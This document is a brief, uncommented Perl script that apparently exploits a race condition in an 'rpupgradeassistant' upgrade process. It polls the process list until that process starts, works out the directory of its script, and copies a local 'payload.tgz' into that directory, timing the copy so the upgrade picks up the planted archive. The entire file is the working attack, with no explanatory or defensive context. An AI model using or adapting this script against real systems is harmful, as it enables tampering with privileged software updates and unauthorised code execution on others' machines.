#!/usr/bin/perl
use strict;
use File::Basename;
print "Checking for rpupgradeassistant process";
my $dir = "";
while ($dir eq "" ) {
    print '.';
    my @output = `ps -ea -o command | grep rpupgradeassistant | grep -v grep`;
      
    next if scalar @output < 1;
    foreach my $line ( @output ) {
        print $line;
        chomp $line;
        $line =~ s/\s*\/bin\/bash\s*//;
        print "LINE IS $line\n";
        if ( -e $line ) {
            $dir = &File::Basename::dirname($line);
            last;
        }
    }
}
print "Copying the payload ... \n";
print time();

`cp payload.tgz $dir/payload.tgz`;
print "\n", time();
print "\n";
print "Done!";
